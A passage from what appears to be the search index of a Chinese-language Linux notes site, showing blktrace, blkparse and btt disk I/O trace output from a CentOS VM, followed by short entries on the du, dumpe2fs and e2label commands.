8 <- (253,1) 7927344 253,0 1 205 0.629615736 291 Q WS 7929392 + 8 [jbd2/vda1-8] 253,0 1 206 0.629615867 291 M WS 7929392 + 8 [jbd2/vda1-8] 253,0 1 207 0.629616209 291 A WS 7929400 + 8 <- (253,1) 7927352 253,0 1 208 0.629616408 291 Q WS 7929400 + 8 [jbd2/vda1-8] 253,0 1 209 0.629616542 291 M WS 7929400 + 8 [jbd2/vda1-8] 253,0 1 210 0.629617126 291 A WS 7929408 + 8 <- (253,1) 7927360 253,0 1 211 0.629617240 291 Q WS 7929408 + 8 [jbd2/vda1-8] 253,0 1 212 0.629617372 291 M WS 7929408 + 8 [jbd2/vda1-8] 253,0 1 213 0.629617659 291 A WS 7929416 + 8 <- (253,1) 7927368 253,0 1 214 0.629617776 291 Q WS 7929416 + 8 [jbd2/vda1-8] 253,0 1 215 0.629617908 291 M WS 7929416 + 8 [jbd2/vda1-8] 253,0 1 216 0.629618181 291 A WS 7929424 + 8 <- (253,1) 7927376 253,0 1 217 0.629618298 291 Q WS 7929424 + 8 [jbd2/vda1-8] 253,0 1 218 0.629618431 291 M WS 7929424 + 8 [jbd2/vda1-8] 253,0 1 219 0.629618932 291 A WS 7929432 + 8 <- (253,1) 7927384 253,0 1 220 0.629619051 291 Q WS 7929432 + 8 [jbd2/vda1-8] 253,0 1 221 0.629619184 291 M WS 7929432 + 8 [jbd2/vda1-8] 253,0 1 222 0.629619455 291 A WS 7929440 + 8 <- (253,1) 7927392 253,0 1 223 0.629619568 291 Q WS 7929440 + 8 [jbd2/vda1-8] 253,0 1 224 0.629619700 291 M WS 7929440 + 8 [jbd2/vda1-8] 253,0 1 225 0.629619977 291 A WS 7929448 + 8 <- (253,1) 7927400 253,0 1 226 0.629620095 291 Q WS 7929448 + 8 [jbd2/vda1-8] 253,0 1 227 0.629620227 291 M WS 7929448 + 8 [jbd2/vda1-8] 253,0 1 228 0.629620500 291 A WS 7929456 + 8 <- (253,1) 7927408 253,0 1 229 0.629620616 291 Q WS 7929456 + 8 [jbd2/vda1-8] 253,0 1 230 0.629620747 291 M WS 7929456 + 8 [jbd2/vda1-8] 253,0 1 231 0.629620940 291 A WS 7929464 + 8 <- (253,1) 7927416 253,0 1 232 0.629621055 291 Q WS 7929464 + 8 [jbd2/vda1-8] 253,0 1 233 0.629621187 291 M WS 7929464 + 8 [jbd2/vda1-8] 253,0 1 234 0.629621380 291 A WS 7929472 + 8 <- (253,1) 7927424 253,0 1 235 0.629621578 291 Q WS 7929472 + 8 [jbd2/vda1-8] 253,0 1 236 0.629621708 291 M WS 7929472 + 8 [jbd2/vda1-8] 253,0 1 237 0.629622048 291 A WS 7929480 + 8 <- (253,1) 7927432 253,0 1 238 0.629622252 291 Q WS 7929480 + 8 [jbd2/vda1-8] 253,0 1 239 0.629622384 291 M WS 7929480 + 8 [jbd2/vda1-8] 253,0 1 240 0.629622715 291 A WS 7929488 + 8 <- (253,1) 7927440 253,0 1 241 0.629622903 291 Q WS 7929488 + 8 [jbd2/vda1-8] 253,0 1 242 0.629623035 291 M WS 7929488 + 8 [jbd2/vda1-8] 253,0 1 243 0.629623303 291 A WS 7929496 + 8 <- (253,1) 7927448 253,0 1 244 0.629623492 291 Q WS 7929496 + 8 [jbd2/vda1-8] 253,0 1 245 0.629623623 291 M WS 7929496 + 8 [jbd2/vda1-8] 253,0 1 246 0.629623887 291 A WS 7929504 + 8 <- (253,1) 7927456 253,0 1 247 0.629624007 291 Q WS 7929504 + 8 [jbd2/vda1-8] 253,0 1 248 0.629624137 291 M WS 7929504 + 8 [jbd2/vda1-8] 253,0 1 249 0.629624908 291 UT N [jbd2/vda1-8] 1 253,0 1 250 0.629625461 291 I WS 7929360 + 152 [jbd2/vda1-8] 253,0 1 251 0.629626881 291 D WS 7929360 + 152 [jbd2/vda1-8] 253,0 0 287 0.631917933 0 C WS 7929360 + 152 [0] 253,0 0 288 0.631942024 291 A FWFS 7929512 + 8 <- (253,1) 7927464 253,0 0 289 0.631942881 291 Q FWFS 7929512 + 8 [jbd2/vda1-8] 253,0 0 290 0.631943388 291 G FWFS 7929512 + 8 [jbd2/vda1-8] 253,0 0 291 0.632065296 284 D WS 7929512 + 8 [kworker/0:1H] 253,0 0 292 0.632775420 0 C WS 7929512 + 8 [0] 253,0 0 293 0.632869996 0 C WS 7929512 [0] 253,0 0 294 6.100700399 291 A WS 7929520 + 8 <- (253,1) 7927472 253,0 0 295 6.100702727 291 Q WS 7929520 + 8 [jbd2/vda1-8] 253,0 0 296 6.100705727 291 G WS 7929520 + 8 [jbd2/vda1-8] 253,0 0 297 6.100709687 291 P N [jbd2/vda1-8] 253,0 0 298 6.100710501 291 A WS 7929528 + 8 <- (253,1) 7927480 253,0 0 299 6.100710732 291 Q WS 7929528 + 8 [jbd2/vda1-8] 253,0 0 300 6.100711905 291 M WS 7929528 + 8 [jbd2/vda1-8] 253,0 0 301 6.100712603 291 A WS 7929536 + 8 <- (253,1) 7927488 253,0 0 302 6.100712850 291 Q WS 7929536 + 8 [jbd2/vda1-8] 253,0 0 303 6.100713058 291 M WS 7929536 + 8 [jbd2/vda1-8] 253,0 0 304 6.100713616 291 A WS 7929544 + 8 <- (253,1) 7927496 253,0 0 305 6.100713853 291 Q WS 7929544 + 8 [jbd2/vda1-8] 253,0 0 306 6.100714068 291 M WS 7929544 + 8 [jbd2/vda1-8] 253,0 0 307 6.100715136 291 A WS 7929552 + 8 <- (253,1) 7927504 253,0 0 308 6.100715394 291 Q WS 7929552 + 8 [jbd2/vda1-8] 253,0 0 309 6.100715624 291 M WS 7929552 + 8 [jbd2/vda1-8] 253,0 0 310 6.100716072 291 A WS 7929560 + 8 <- (253,1) 7927512 253,0 0 311 6.100716243 291 Q WS 7929560 + 8 [jbd2/vda1-8] 253,0 0 312 6.100716444 291 M WS 7929560 + 8 [jbd2/vda1-8] 253,0 0 313 6.100716910 291 A WS 7929568 + 8 <- (253,1) 7927520 253,0 0 314 6.100717153 291 Q WS 7929568 + 8 [jbd2/vda1-8] 253,0 0 315 6.100717376 291 M WS 7929568 + 8 [jbd2/vda1-8] 253,0 0 316 6.100717752 291 A WS 7929576 + 8 <- (253,1) 7927528 253,0 0 317 6.100717986 291 Q WS 7929576 + 8 [jbd2/vda1-8] 253,0 0 318 6.100718199 291 M WS 7929576 + 8 [jbd2/vda1-8] 253,0 0 319 6.100718688 291 A WS 7929584 + 8 <- (253,1) 7927536 253,0 0 320 6.100718916 291 Q WS 7929584 + 8 [jbd2/vda1-8] 253,0 0 321 6.100719137 291 M WS 7929584 + 8 [jbd2/vda1-8] 253,0 0 322 6.100719664 291 A WS 7929592 + 8 <- (253,1) 7927544 253,0 0 323 6.100719882 291 Q WS 7929592 + 8 [jbd2/vda1-8] 253,0 0 324 6.100720106 291 M WS 7929592 + 8 [jbd2/vda1-8] 253,0 0 325 6.100720506 291 A WS 7929600 + 8 <- (253,1) 7927552 253,0 0 326 6.100720680 291 Q WS 7929600 + 8 [jbd2/vda1-8] 253,0 0 327 6.100720907 291 M WS 7929600 + 8 [jbd2/vda1-8] 253,0 0 328 6.100722039 291 UT N [jbd2/vda1-8] 1 253,0 0 329 6.100722945 291 I WS 7929520 + 88 [jbd2/vda1-8] 253,0 0 330 6.100726933 291 D WS 7929520 + 88 [jbd2/vda1-8] 253,0 0 331 6.102471460 0 C WS 7929520 + 88 [0] 253,0 0 332 6.102490992 291 A FWFS 7929608 + 8 <- (253,1) 7927560 253,0 0 333 6.102491627 291 Q FWFS 7929608 + 8 [jbd2/vda1-8] 253,0 0 334 6.102491999 291 G FWFS 7929608 + 8 [jbd2/vda1-8] 253,0 0 335 6.102604873 284 D WS 7929608 + 8 [kworker/0:1H] 253,0 0 336 6.103623307 0 C WS 7929608 + 8 [0] 253,0 0 337 6.103697330 0 C WS 7929608 [0] 253,0 2 1 7.234825143 6234 A WS 25475264 + 24 <- (253,1) 25473216 253,0 2 2 7.234827666 6234 Q WS 25475264 + 24 [YDService] 253,0 2 3 7.234830346 6234 G WS 25475264 + 24 [YDService] 253,0 2 4 7.234833032 6234 P N [YDService] 253,0 2 5 7.234834582 6234 UT N [YDService] 1 253,0 2 6 7.234835663 6234 I WS 25475264 + 24 [YDService] 253,0 2 7 7.234838679 6234 D WS 25475264 + 24 [YDService] 253,0 0 338 7.235957452 0 C WS 25475264 + 24 [0] 253,0 0 339 7.236031308 291 A WS 7929616 + 8 <- (253,1) 7927568 253,0 0 340 7.236032272 291 Q WS 7929616 + 8 [jbd2/vda1-8] 253,0 0 341 7.236033847 291 G WS 7929616 + 8 [jbd2/vda1-8] 253,0 0 342 7.236036110 291 P N [jbd2/vda1-8] 253,0 0 343 7.236036725 291 A WS 7929624 + 8 <- (253,1) 7927576 253,0 0 344 7.236036965 291 Q WS 7929624 + 8 [jbd2/vda1-8] 253,0 0 345 7.236037860 291 M WS 7929624 + 8 [jbd2/vda1-8] 253,0 0 346 7.236038571 291 A WS 7929632 + 8 <- (253,1) 7927584 253,0 0 347 7.236038840 291 Q WS 7929632 + 8 [jbd2/vda1-8] 253,0 0 348 7.236039076 291 M WS 7929632 + 8 [jbd2/vda1-8] 253,0 0 349 7.236039708 291 A WS 7929640 + 8 <- (253,1) 7927592 253,0 0 350 7.236040053 291 Q WS 7929640 + 8 [jbd2/vda1-8] 253,0 0 351 7.236040335 291 M WS 7929640 + 8 [jbd2/vda1-8] 253,0 0 352 7.236040794 291 A WS 7929648 + 8 <- (253,1) 7927600 253,0 0 353 7.236041051 291 Q WS 7929648 + 8 [jbd2/vda1-8] 253,0 0 354 7.236041283 291 M WS 7929648 + 8 [jbd2/vda1-8] 253,0 0 355 7.236041687 291 A WS 7929656 + 8 <- (253,1) 7927608 253,0 0 356 7.236041881 291 Q WS 7929656 + 8 [jbd2/vda1-8] 253,0 0 357 7.236042133 291 M WS 7929656 + 8 [jbd2/vda1-8] 253,0 0 358 7.236042477 291 A WS 7929664 + 8 <- (253,1) 7927616 253,0 0 359 7.236042670 291 Q WS 7929664 + 8 [jbd2/vda1-8] 253,0 0 360 7.236042905 291 M WS 7929664 + 8 [jbd2/vda1-8] 253,0 0 361 7.236043592 291 A WS 7929672 + 8 <- (253,1) 7927624 253,0 0 362 7.236043793 291 Q WS 7929672 + 8 [jbd2/vda1-8] 253,0 0 363 7.236043998 291 M WS 7929672 + 8 [jbd2/vda1-8] 253,0 0 364 7.236044477 291 A WS 7929680 + 8 <- (253,1) 7927632 253,0 0 365 7.236044653 291 Q WS 7929680 + 8 [jbd2/vda1-8] 253,0 0 366 7.236044869 291 M WS 7929680 + 8 [jbd2/vda1-8] 253,0 0 367 7.236045709 291 A WS 7929688 + 8 <- (253,1) 7927640 253,0 0 368 7.236046036 291 Q WS 7929688 + 8 [jbd2/vda1-8] 253,0 0 369 7.236057252 291 M WS 7929688 + 8 [jbd2/vda1-8] 253,0 0 370 7.236057852 291 A WS 7929696 + 8 <- (253,1) 7927648 253,0 0 371 7.236058077 291 Q WS 7929696 + 8 [jbd2/vda1-8] 253,0 0 372 7.236058286 291 M WS 7929696 + 8 [jbd2/vda1-8] 253,0 0 373 7.236059324 291 UT N [jbd2/vda1-8] 1 253,0 0 374 7.236060184 291 I WS 7929616 + 88 [jbd2/vda1-8] 253,0 0 375 7.236062500 291 D WS 7929616 + 88 [jbd2/vda1-8] 253,0 0 376 7.237660002 0 C WS 7929616 + 88 [0] 253,0 0 377 7.237682084 291 A FWFS 7929704 + 8 <- (253,1) 7927656 253,0 0 378 7.237682713 291 Q FWFS 7929704 + 8 [jbd2/vda1-8] 253,0 0 379 7.237682989 291 G FWFS 7929704 + 8 [jbd2/vda1-8] 253,0 0 380 7.237834365 284 D WS 7929704 + 8 [kworker/0:1H] 253,0 0 381 7.238811564 0 C WS 7929704 + 8 [0] 253,0 0 382 7.238915905 0 C WS 7929704 [0] 253,0 2 8 7.238986214 6234 A WS 25475264 + 8 <- (253,1) 25473216 253,0 2 9 7.238987851 6234 Q WS 25475264 + 8 [YDService] 253,0 2 10 7.238988819 6234 G WS 25475264 + 8 [YDService] 253,0 2 11 7.238990407 6234 P N [YDService] 253,0 2 12 7.238991052 6234 UT N [YDService] 1 253,0 2 13 7.238991628 6234 I WS 25475264 + 8 [YDService] 253,0 2 14 7.239005299 6234 D WS 25475264 + 8 [YDService] 253,0 0 383 7.239888096 0 C WS 25475264 + 8 [0] 253,0 0 384 7.239938613 291 A WS 7929712 + 8 <- (253,1) 7927664 253,0 0 385 7.239939517 291 Q WS 7929712 + 8 [jbd2/vda1-8] 253,0 0 386 7.239940231 291 G WS 7929712 + 8 [jbd2/vda1-8] 253,0 0 387 7.239941282 291 P N [jbd2/vda1-8] 253,0 0 388 7.239941694 291 A WS 7929720 + 8 <- (253,1) 7927672 253,0 0 389 7.239942093 291 Q WS 7929720 + 8 [jbd2/vda1-8] 253,0 0 390 7.239943049 291 M WS 7929720 + 8 [jbd2/vda1-8] 253,0 0 391 7.239943816 291 UT N [jbd2/vda1-8] 1 253,0 0 392 7.239944390 291 I WS 7929712 + 16 [jbd2/vda1-8] 253,0 0 393 7.239945588 291 D WS 7929712 + 16 [jbd2/vda1-8] 253,0 0 394 7.240935597 0 C WS 7929712 + 16 [0] 253,0 0 395 7.240946972 291 A FWFS 7929728 + 8 <- (253,1) 7927680 253,0 0 396 7.240947401 291 Q FWFS 7929728 + 8 [jbd2/vda1-8] 253,0 0 397 7.240947679 291 G FWFS 7929728 + 8 [jbd2/vda1-8] 253,0 0 398 7.241051410 284 D WS 7929728 + 8 [kworker/0:1H] 253,0 0 399 7.241991106 0 C WS 7929728 + 8 [0] 253,0 0 400 7.242084868 0 C WS 7929728 [0] 253,0 2 15 7.242139450 6234 A WS 17121960 + 16 <- (253,1) 17119912 253,0 2 16 7.242140532 6234 Q WS 17121960 + 16 [YDService] 253,0 2 17 7.242141469 6234 G WS 17121960 + 16 [YDService] 253,0 2 18 7.242142601 6234 P N [YDService] 253,0 2 19 7.242143182 6234 UT N [YDService] 1 253,0 2 20 7.242143604 6234 I WS 17121960 + 16 [YDService] 253,0 2 21 7.242144834 6234 D WS 17121960 + 16 [YDService] 253,0 0 401 7.245747942 0 C WS 17121960 + 16 [0] 253,0 0 402 7.245799517 291 A WS 7929736 + 8 <- (253,1) 7927688 253,0 0 403 7.245800161 291 Q WS 7929736 + 8 [jbd2/vda1-8] 253,0 0 404 7.245800912 291 G WS 7929736 + 8 [jbd2/vda1-8] 253,0 0 405 7.245801994 291 P N [jbd2/vda1-8] 253,0 0 406 7.245802497 291 A WS 7929744 + 8 <- (253,1) 7927696 253,0 0 407 7.245802747 291 Q WS 7929744 + 8 [jbd2/vda1-8] 253,0 0 408 7.245803266 291 M WS 7929744 + 8 [jbd2/vda1-8] 253,0 0 409 7.245803950 291 UT N [jbd2/vda1-8] 1 253,0 0 410 7.245804360 291 I WS 7929736 + 16 [jbd2/vda1-8] 253,0 0 411 7.245805765 291 D WS 7929736 + 16 [jbd2/vda1-8] 253,0 0 412 7.246696643 0 C WS 7929736 + 16 [0] 253,0 0 413 7.246708021 291 A FWFS 7929752 + 8 <- (253,1) 7927704 253,0 0 414 7.246708418 291 Q FWFS 7929752 + 8 [jbd2/vda1-8] 253,0 0 415 7.246708677 291 G FWFS 7929752 + 8 [jbd2/vda1-8] 253,0 0 416 7.246814502 284 D WS 7929752 + 8 [kworker/0:1H] 253,0 0 417 7.247668647 0 C WS 7929752 + 8 [0] 253,0 0 418 7.247757651 0 C WS 7929752 [0] CPU0 (myvda): Reads Queued: 0, 0KiB Writes Queued: 87, 348KiB Read Dispatches: 0, 0KiB Write Dispatches: 34, 348KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 72, 640KiB Read Merges: 0, 0KiB Write Merges: 53, 212KiB Read depth: 0 Write depth: 3 IO unplugs: 0 Timer unplugs: 17 CPU1 (myvda): Reads Queued: 0, 0KiB Writes Queued: 63, 268KiB Read Dispatches: 0, 0KiB Write Dispatches: 18, 268KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 0, 0KiB Read Merges: 0, 0KiB Write Merges: 45, 180KiB Read depth: 0 Write depth: 3 IO unplugs: 0 Timer unplugs: 13 CPU2 (myvda): Reads Queued: 0, 0KiB Writes Queued: 3, 24KiB Read Dispatches: 0, 0KiB Write Dispatches: 3, 24KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 0, 0KiB Read Merges: 0, 0KiB Write Merges: 0, 0KiB Read depth: 0 Write depth: 3 IO unplugs: 0 Timer unplugs: 3 Total (myvda): Reads Queued: 0, 0KiB Writes Queued: 153, 640KiB Read Dispatches: 0, 0KiB Write Dispatches: 55, 640KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 72, 640KiB Read Merges: 0, 0KiB Write Merges: 98, 392KiB IO unplugs: 0 Timer unplugs: 33 Throughput (R/W): 0KiB/s / 88KiB/s Events (myvda): 690 entries Skips: 0 forward (0 - 0.0%) [root@VM-0-16-centos mydata]# ls myvdabin myvda.blktrace.0 myvda.blktrace.1 myvda.blktrace.2 myvda.blktrace.3 [root@VM-0-16-centos mydata]# btt -I iostatreport -i myvdabin ==================== All Devices ==================== ALL MIN AVG MAX N --------------- ------------- ------------- ------------- ----------- Q2Qdm 0.000000438 0.047675694 5.468759846 152 Q2Cdm 0.000631999 0.001516763 0.003607410 153 Q2G 0.000000160 0.000000786 0.000004391 55 G2I 0.000001009 0.000004959 0.000026337 38 Q2M 0.000000126 0.000000332 0.000011216 98 I2D 0.000000630 0.000002691 0.000017820 38 M2D 0.000001295 0.000008099 0.000024640 98 D2C 0.000630444 0.001496100 0.003603108 153 ==================== Device Overhead ==================== DEV | Q2G G2I Q2M I2D D2C ---------- | --------- --------- --------- --------- --------- ==================== Device Merge Information ==================== DEV | #Q #D Ratio | BLKmin BLKavg BLKmax Total ---------- | -------- -------- ------- | -------- -------- -------- -------- (253, 0) | 153 55 2.8 | 8 23 224 1280 ==================== Device Q2Q Seek Information ==================== DEV | NSEEKS MEAN MEDIAN | MODE ---------- | --------------- --------------- --------------- | --------------- (253, 0) | 153 3417216.7 0 | 0(116) ---------- | --------------- --------------- --------------- | --------------- Overall | NSEEKS MEAN MEDIAN | MODE Average | 153 3417216.7 0 | 0(116) ==================== Device D2D Seek Information ==================== DEV | NSEEKS MEAN MEDIAN | MODE ---------- | --------------- --------------- --------------- | --------------- (253, 0) | 55 9506075.1 0 | 0(18) ---------- | --------------- --------------- --------------- | --------------- Overall | NSEEKS MEAN MEDIAN | MODE Average | 55 9506075.1 0 | 0(18) ==================== Plug Information ==================== DEV | # Plugs # Timer Us | % Time Q Plugged ---------- | ---------- ---------- | ---------------- (253, 0) | 0( 33) | 0.001672731% DEV | IOs/Unp IOs/Unp(to) ---------- | ---------- ---------- (253, 0) | 0.0 1.2 ---------- | ---------- ---------- Overall | IOs/Unp IOs/Unp(to) Average | 0.0 1.2 ==================== Active Requests At Q Information ==================== DEV | Avg Reqs @ Q ---------- | ------------- ==================== I/O Active Period Information ==================== DEV | # Live Avg. Act Avg. !Act % Live ---------- | ---------- ------------- ------------- ------ (253, 0) | 50 0.001091889 0.146797433 0.75 ---------- | ---------- ------------- ------------- ------ Total Sys | 50 0.001091889 0.146797433 0.75 # Total System # Total System : q activity 0.000002963 0.0 0.000002963 0.4 0.041019970 0.4 0.041019970 0.0 0.628180716 0.0 0.628180716 0.4 0.631942881 0.4 0.631942881 0.0 6.100702727 0.0 6.100702727 0.4 6.102491627 0.4 6.102491627 0.0 7.234827666 0.0 7.234827666 0.4 7.246708418 0.4 7.246708418 0.0 # Total System : c activity 0.000910827 0.5 0.000910827 0.9 0.042000051 0.9 0.042000051 0.5 0.629566828 0.5 0.629566828 0.9 0.632775420 0.9 0.632775420 0.5 6.102471460 0.5 6.102471460 0.9 6.103623307 0.9 6.103623307 0.5 7.235957452 0.5 7.235957452 0.9 7.247668647 0.9 7.247668647 0.5 # Per process # YDService : q activity 7.234827666 1.0 7.234827666 1.4 7.242140532 1.4 7.242140532 1.0 # YDService : c activity # auditd : q activity 0.628180716 2.0 0.628180716 2.4 0.628180716 2.4 0.628180716 2.0 # auditd : c activity # barad_agent : q activity 0.000002963 3.0 0.000002963 3.4 0.039442111 3.4 0.039442111 3.0 # barad_agent : c activity # jbd2 : q activity 0.000961174 4.0 0.000961174 4.4 0.041019970 4.4 0.041019970 4.0 0.629608842 4.0 0.629608842 4.4 0.631942881 4.4 0.631942881 4.0 6.100702727 4.0 6.100702727 4.4 6.102491627 4.4 6.102491627 4.0 7.236032272 4.0 7.236032272 4.4 7.246708418 4.4 7.246708418 4.0 # jbd2 : c activity # kernel : q activity # kernel : c activity 0.000910827 5.5 0.000910827 5.9 0.042000051 5.9 0.042000051 5.5 0.629566828 5.5 0.629566828 5.9 0.632775420 5.9 0.632775420 5.5 6.102471460 5.5 6.102471460 5.9 6.103623307 5.9 6.103623307 5.5 7.235957452 5.5 7.235957452 5.9 7.247668647 5.9 7.247668647 5.5 [root@VM-0-16-centos mydata]# cat iostatreport Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util Stamp (253, 0) 0.00 12.46 0.00 7.21 0.00 162.60 0.00 81.30 22.55 -74.00 1.40 4.12 10.37 6.10 (253, 0) 0.00 8.82 0.00 1.76 0.00 84.65 0.00 42.32 48.00 -85.98 1.61 10.23 0.26 7.23 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util Stamp (253, 0) 0.00 13.52 0.00 7.59 0.00 176.61 0.00 88.30 23.27 -75.91 1.40 4.22 8.95 TOTAL","title":"\u547d\u4ee4\u9009\u9879"},{"location":"system/linux/IO/blktrace%E5%B8%B8%E7%94%A8%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","text":"blktrace\u547d\u4ee4 mount -t debugfs debugfs /sys/kernel/debug \u4f8b\u5982\u5bf9sda\uff1a\u627e\u4e2a\u4e0d\u662fsda\u7684\u76ee\u5f55\uff0c\u65b0\u5efa\u4e2a\u76ee\u5f55\uff0c\u8fdb\u5165\u65b0\u76ee\u5f55\u6d4b\u8bd5\u3002blktrace -d /dev/sda\uff0c\u6267\u884c20\u79d2\uff0c \u7136\u540ecrtl+c\u4e2d\u65ad\u6389\uff0c\u7136\u540e\u4f1a\u751f\u6210\u4e00\u5806\u6587\u4ef6\uff0c\u7136\u540e\u6267\u884c\u547d\u4ee4blkparse -i sda -d sda.blktrace.bin \uff0c\u7136\u540e\u6267\u884cbtt -i sda.blktrace.bin > report.txt \u67e5\u770b\u62a5\u544a D2C\u9ad8\u5c31\u4e0d\u884c \u6e90\u4ee3\u7801\u5730\u5740 https://git.kernel.dk/cgit/blktrace/ Q2I\uff1a\u751f\u6210IO\u8bf7\u6c42","title":"blktrace\u5e38\u7528\u4f7f\u7528\u65b9\u6cd5"},{"location":"system/linux/IO/du/","text":"du\u547d\u4ee4 du(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u5927\u5c0f\u8fdb\u884c\u6392\u884c\uff1a du -sh ./* 2>/dev/null | sort -k1rh [root@www /var]# du -sh ./* 2>/dev/null | sort -k1rh 5.5G ./log 2.1G ./lib 225M ./cache \u67e5\u770b\u7cfb\u7edf\u4e2d\u5927\u76ee\u5f55\u5e76\u6392\u5e8f [root@www /] #du -h / 2>/dev/null| sort -k1rh | head -n 20 191G / 171G /dev 170G /dev/sdfsd 7.9G /var 5.6G /sdfsdfsdfsd sort -k \u662f\u6309\u7167\u54ea\u5217\u53bb\u6392\u5e8f\uff0c-h\u662f\u6839\u636e\u5b58\u50a8\u5bb9\u91cf\u6392\u5e8f(\u6ce8\u610f\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1a2K 1G)\u3002-r \u9006\u5e8f\u8f93\u51fa\u6392\u5e8f\u7ed3\u679c sort linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com)","title":"\u67e5\u770b\u76ee\u5f55\u5927\u5c0f"},{"location":"system/linux/IO/du/#du","text":"du(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u5927\u5c0f\u8fdb\u884c\u6392\u884c\uff1a du -sh ./* 2>/dev/null | sort -k1rh [root@www /var]# du -sh ./* 2>/dev/null | sort -k1rh 5.5G ./log 2.1G ./lib 225M ./cache \u67e5\u770b\u7cfb\u7edf\u4e2d\u5927\u76ee\u5f55\u5e76\u6392\u5e8f [root@www /] #du -h / 2>/dev/null| sort -k1rh | head -n 20 191G / 171G /dev 170G /dev/sdfsd 7.9G /var 5.6G /sdfsdfsdfsd sort -k \u662f\u6309\u7167\u54ea\u5217\u53bb\u6392\u5e8f\uff0c-h\u662f\u6839\u636e\u5b58\u50a8\u5bb9\u91cf\u6392\u5e8f(\u6ce8\u610f\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1a2K 1G)\u3002-r \u9006\u5e8f\u8f93\u51fa\u6392\u5e8f\u7ed3\u679c sort linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com)","title":"du\u547d\u4ee4"},{"location":"system/linux/IO/dumpe2fs/","text":"dumpe2fs\u547d\u4ee4 ext2/ext3/ext4 \u6587\u4ef6\u7cfb\u7edf\u67e5\u770b\u547d\u4ee4 \u90e8\u5206\u89e3\u91ca [root@server2 ~]# dumpe2fs -h /dev/sda2 Default mount options: user_xattr acl //\u9ed8\u8ba4\u6302\u8f7d\u9009\u9879 Filesystem state: clean //\u8bf4\u660e\u8be5\u6587\u4ef6\u7cfb\u7edf\u6ca1\u6709\u95ee\u9898 Filesystem OS type: Linux //\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c\u7cfb\u7edf\u7c7b\u578b Inode count: 1310720 //i\u8282\u70b9\u6570\u91cf Block count: 5242880 //\u6570\u636e\u5757\u7684\u6570\u91cf Reserved block count: 262144 //\u4fdd\u7559\u7684\u5757\u7684\u6570\u91cf Free blocks: 4454735 //\u7a7a\u95f2\u7684\u5757\u7684\u6570\u91cf Free inodes: 1218481 //\u7a7a\u95f2\u7684i\u8282\u70b9\u7684\u6570\u91cf Block size: 4096 //\u5757\u7684\u5927\u5c0f (4KB) Blocks per group: 32768 Inodes per group: 8192 Inode blocks per group: 512 Inode size: 256 //i\u8282\u70b9\u7684\u5927\u5c0f(\u5355\u4f4d\u662f\u5b57\u8282) \u5b8c\u6574 [root@VM-0-16-centos ~]# dumpe2fs -h /dev/vda1 dumpe2fs 1.42.9 (28-Dec-2013) Filesystem volume name: <none> Last mounted on: / Filesystem UUID: 2c04c946-7fee-41c2-a99f-f53e2532e4f7 Filesystem magic number: 0xEF53 Filesystem revision #: 1 (dynamic) Filesystem features: has_journal ext_attr resize_inode dir_index filetype needs_recovery extent sparse_super large_file uninit_bg Filesystem flags: signed_directory_hash Default mount options: user_xattr acl Filesystem state: clean Errors behavior: Continue Filesystem OS type: Linux Inode count: 3276800 Block count: 13106939 Reserved block count: 544984 Free blocks: 12354403 Free inodes: 3205489 First block: 0 Block size: 4096 Fragment size: 4096 Reserved GDT blocks: 508 Blocks per group: 32768 Fragments per group: 32768 Inodes per group: 8192 Inode blocks per group: 512 Filesystem created: Tue Jan 9 18:18:51 2018 Last mount time: Mon Aug 15 20:43:44 2022 Last write time: Mon Aug 15 20:43:44 2022 Mount count: 14 Maximum mount count: -1 Last checked: Fri Aug 17 11:27:10 2018 Check interval: 0 (<none>) Lifetime writes: 47 GB Reserved blocks uid: 0 (user root) Reserved blocks gid: 0 (group root) First inode: 11 Inode size: 256 Required extra isize: 28 Desired extra isize: 28 Journal inode: 8 First orphan inode: 333773 Default directory hash: half_md4 Directory Hash Seed: 195b1821-47d9-4d62-a960-e58fc3c9b07c Journal backup: inode blocks Journal features: journal_incompat_revoke Journal size: 128M Journal length: 32768 Journal sequence: 0x00026259 Journal start: 21137","title":"dumpe2fs"},{"location":"system/linux/IO/e2label/","text":"e2label\u547d\u4ee4 e2label\u5c06\u663e\u793a\u6216\u66f4\u6539\u4f4d\u4e8e\u8bbe\u5907\u4e0a\u7684ext2\u3001ext3\u6216ext4\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u3002 \u5982\u679c\u53ef\u9009\u53c2\u6570new label\u4e0d\u5b58\u5728\uff0ce2label\u5c06\u53ea\u663e\u793a\u5f53\u524d\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u3002 \u5982\u679c\u5b58\u5728\u53ef\u9009\u53c2\u6570new label\uff0c\u5219e2label\u5c06\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u8bbe\u7f6e\u4e3anew label\u3002Ext2\u6587\u4ef6\u7cfb\u7edf\u6807\u7b7e\u7684\u957f\u5ea6\u6700\u591a\u53ef\u4ee5\u662f16\u4e2a\u5b57\u7b26\uff1b\u5982\u679c\u65b0\u6807\u7b7e\u8d85\u8fc716\u4e2a\u5b57\u7b26\uff0ce2label\u5c06\u622a\u65ad\u5b83\u5e76\u6253\u5370\u4e00\u6761\u8b66\u544a\u6d88\u606f\u3002 \u67e5\u770b\u8bbe\u5907label #e2label /dev/sda1 disk1 \u8bbe\u7f6e\u8bbe\u5907label e2label /dev/sda1 mydisk e2label \u547d\u4ee4\uff0cLinux e2label 